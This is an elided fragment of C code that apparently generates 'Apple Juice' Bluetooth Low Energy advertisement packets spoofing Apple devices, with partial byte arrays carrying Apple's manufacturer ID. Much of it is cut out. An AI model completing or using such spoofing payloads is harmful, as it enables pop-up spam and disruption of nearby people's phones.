...
static const uint8_t IOS1[] = {0x02,
                               0x0e,
                               0x0a,
                               0x0f,
                               0x13,
...
int generate_apple_juice_payload(uint8_t *buffer, size_t max_len) {
  ...
  if (rand_choice == 0) {
    ...
    uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, device_byte, 0x20, 0x75, 0xaa,
    ...
    uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04,        0x2a, 0x00,
